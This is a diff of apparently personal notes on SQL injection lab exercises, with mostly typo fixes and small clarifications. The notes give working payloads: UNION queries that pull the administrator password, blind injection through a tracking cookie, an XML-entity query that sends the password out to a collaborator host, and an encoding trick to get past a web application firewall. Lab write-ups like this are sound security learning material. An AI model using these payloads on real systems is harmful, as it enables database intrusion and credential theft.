@@ -144,7 +144,7 @@ Then we need to pull data on the tables in the db
 Use the table you can deduce contains user creds
 
 ```
-' UNION SELECT column_name, NULL FROM information_schema.tables WHERE table_name='users_abcdef'--
+' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_abcdef'--
 ```
 
 Then pull out the administrator pass with this:
@@ -209,7 +209,7 @@ We can concatenate two values into one to pull from a single column. More concat
 
 ### Blind SQL injection with conditional responses
 
-There exists a TrackingId cokie value when visiting the site. 
+There exists a TrackingId cookie value when visiting the site. 
 - When we go to the site we see a `Welcome back` message in the website.
 - If we add `' AND '1'='1` to the cookie we still see this message still.
 - Now place `' AND '1'='2` and notice we don't get a message back, this means we can craft to identify values in the db
@@ -228,7 +228,7 @@ Same injection point within the TrackingId cookie.
 
 Steps to follow:
 - inject `'` into the cookie value, notice an internal server error
-- inject `''` and notice no errors, we can deduce based on conditional errors for our usecase. In this example this is an Oracle DB so make sure to add the FROM DUAL for all queries
+- inject `''` and notice no errors, we can deduce based on conditional errors for our use case. In this example this is an Oracle DB so make sure to add the FROM DUAL for all queries
 - inject `'||(SELECT '')||'` and notice the error, again use FROM DUAL to get no errors, meaning our syntax is correct: `'||(SELECT '' FROM DUAL)||'`
 - use users table name to see if that exists, if you get an error you know it doesn't. You have to do something like this: `'||(SELECT '' FROM users where rownum = 1)||'`, `where rownum =1` makes sure we don't break the concatentation and limits the response to 1 row.
 - from the cheat sheet we use this: `'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM DUAL)||'` and `'||(SELECT CASE WHEN (1=0) THEN TO_CHAR(1/0) ELSE NULL END FROM DUAL)||'`, notice errors happen with one instead of the other
@@ -266,6 +266,8 @@ now we add a condition to trigger the sleep
 
 ### Blind SQL injection with out-of-band interaction
 
+Within TrackingId cookie value:
+
 Injection: `' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual--`
 
 ### Blind SQL injection with out-of-band data exfiltration
@@ -273,12 +275,14 @@ Injection: `' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="U
 Pulling data out with concatenating it and putting it in as a subdomain to our collaborator:
 `' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual--`
 
+poll the collaborator and the subdomain to the domain is the password for administrator to log in
+
 ### SQL injection with filter bypass via XML encoding
 
-This time we notice that the stock check feature sends the productId and storeId to the pplication in XML format. 
+This time we notice that the stock check feature sends the productId and storeId to the application in XML format. 
 - send the `POST /product/stock` to repeater
 - see if input is evaluated, enter this in the body: `<storeId>1+1</storeId>` if it does the math our data is being evaluated
-- now we can use a UNION attack to pull data out: `<storeId>1 UNION SELECT NULL</storeId>` we got blocked due to being flagged as a potential attack
+- now we can use a UNION attack to pull data out: `<storeId>1 UNION SELECT NULL</storeId>` we got blocked due to being flagged as a potential attack "Attack detected"
 - To bypass the waf we can use the Hackvertor extension to encode our input: `Extensions > Hackvertor > Encode > dec_entities/hex_entities`
 - Resend and notice now we are no longer blocked
 - Now send this: `<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users<@/hex_entities></storeId>`
